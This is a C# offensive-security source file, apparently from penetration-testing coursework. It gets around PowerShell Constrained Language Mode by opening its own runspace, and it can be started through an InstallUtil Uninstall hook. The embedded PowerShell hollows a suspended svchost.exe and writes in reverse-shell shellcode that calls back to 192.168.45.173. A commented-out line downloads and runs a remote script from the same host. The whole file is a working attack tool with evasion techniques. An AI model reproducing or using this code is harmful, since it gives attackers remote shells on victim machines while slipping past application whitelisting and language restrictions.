// We need to install with NuGet package manager some dependencies for the project prior compilation:
// Install-Package System.Management.Automation.dll -Version 10.0.10586
// Install-Package Core.System.Configuration.Install -Version 1.1.0

using System;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace PsBypassCostraintLanguageMode
{
    public class Program
    {
        public static void Main()
        {


            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke(
                // The code inserted here was taken from Powershell-Scripts directory, the file called procHollow.ps1  
                "[Byte[]] $SHELLCODE = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x2d,0xad,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5\r\n\r\nfilter Get-Type ([string]$dllName,[string]$typeName)\r\n{\r\n    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals($dllName) )\r\n    {\r\n        $_.GetType($typeName)\r\n    }\r\n}\r\n\r\nfunction Get-Function\r\n{\r\n    Param(\r\n        [string] $module,\r\n        [string] $function\r\n    )\r\n\r\n    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )\r\n    {\r\n        throw \"Error: GetModuleHandle and GetProcAddress must be initialized first!\"\r\n    }\r\n\r\n    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))\r\n    $GetProcAddress.Invoke($null, @($moduleHandle, $function))\r\n}\r\n\r\nfunction Get-Delegate\r\n{\r\n    Param (\r\n        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,\r\n        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,\r\n        [Parameter(Position = 2)] [Type] $retType = [Void]\r\n    )\r\n\r\n    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).\r\n    DefineDynamicModule('QM', $false).\r\n    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\r\n    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')\r\n    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')\r\n    $delegate = $type.CreateType()\r\n\r\n    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)\r\n}\r\n\r\n# Obtain the required types via reflection\r\n$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()\r\n$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'\r\n$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'\r\n$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'\r\n$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'\r\n\r\n# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess\r\n$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')\r\n$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);\r\n$CreateProcess = $nativeMethodsType.GetMethod(\"CreateProcess\")\r\n\r\n# Obtain the function addresses of the required hollowing functions\r\n$ResumeThreadAddr = Get-Function \"kernel32.dll\" \"ResumeThread\"\r\n$ReadProcessMemoryAddr = Get-Function \"kernel32.dll\" \"ReadProcessMemory\"\r\n$WriteProcessMemoryAddr = Get-Function \"kernel32.dll\" \"WriteProcessMemory\"\r\n$ZwQueryInformationProcessAddr = Get-Function \"ntdll.dll\" \"ZwQueryInformationProcess\"\r\n\r\n# Create the delegate types to call the previously obtain function addresses\r\n$ResumeThread = Get-Delegate $ResumeThreadAddr @([IntPtr])\r\n$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])\r\n$ReadProcessMemory = Get-Delegate $ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])\r\n$ZwQueryInformationProcess = Get-Delegate $ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])\r\n\r\n# Instantiate the required structures for CreateProcess and use them to launch svchost.exe\r\n$startupInformation = $startupInformationType.GetConstructors().Invoke($null)\r\n$processInformation = $processInformationType.GetConstructors().Invoke($null)\r\n\r\n$cmd = [System.Text.StringBuilder]::new(\"C:\\\\Windows\\\\System32\\\\svchost.exe\")\r\n$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))\r\n\r\n# Obtain the required handles from the PROCESS_INFORMATION structure\r\n$hThread = $processInformation.hThread\r\n$hProcess = $processInformation.hProcess\r\n\r\n# Create a buffer to hold the PROCESS_BASIC_INFORMATION structure and call ZwQueryInformationProcess\r\n$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)\r\n$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, 0)\r\n\r\n# Locate the image base address. The address of the PEB is the second element within the PROCESS_BASIC_INFORMATION\r\n# structure (e.g. offset 0x08 within the $processBasicInformation buffer on x64). Within the PEB, the base image\r\n# addr is located at offset 0x10.\r\n$imageBaseAddrPEB = ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation, 0x08) + 0x10))\r\n\r\n# Use ReadProcessMemory to read the required part of the PEB. We allocate already a buffer for 0x200\r\n# bytes that we will use later on. From the PEB we actually only need 0x08 bytes, as $imageBaseAddrPEB\r\n# already points to the correct memory location. We parse the obtained 0x08 bytes as Int64 and IntPtr.\r\n$memoryBuffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)\r\n$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0)\r\n\r\n$imageBaseAddr = [BitConverter]::ToInt64($memoryBuffer, 0)\r\n$imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr)\r\n\r\n# Now that we have the base address, we can read the first 0x200 bytes to obtain the PE file format header.\r\n# The offset of the PE header is at 0x3c within the PE file format header. Within the PE header, the relative\r\n# entry point address can be found at an offset of 0x28. We combine this with the $imageBaseAddr and have finally\r\n# found the non relative entry point address.\r\n$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0)\r\n\r\n$peOffset = [BitConverter]::ToUInt32($memoryBuffer, 0x3c)                               # PE header offset\r\n$entryPointAddrRelative = [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28)     # Relative entrypoint\r\n$entryPointAddr = [IntPtr]::new($imageBaseAddr + $entryPointAddrRelative)               # Absolute entrypoint\r\n\r\n# Overwrite the entrypoint with shellcode and resume the thread.\r\n$WriteProcessMemory.Invoke($hProcess, $entryPointAddr, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)\r\n$ResumeThread.Invoke($hThread)\r\n\r\n# Close powershell to remove it as the parent of svchost.exe\r\nexit"

                );


            //Runspace runspace2 = RunspaceFactory.CreateRunspace();
            //runspace2.Open();
            //RunspaceInvoke runSpaceInvoker2 = new RunspaceInvoke(runspace2);
            //runSpaceInvoker.Invoke("iex(iwr http://192.168.45.173/rev.txt -UseBasicParsing)");

        }
    }

        [System.ComponentModel.RunInstaller(true)]
        public class Loader : System.Configuration.Install.Installer
        {

            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                base.Uninstall(savedState);

            Program.Main();
            }
        }

    }

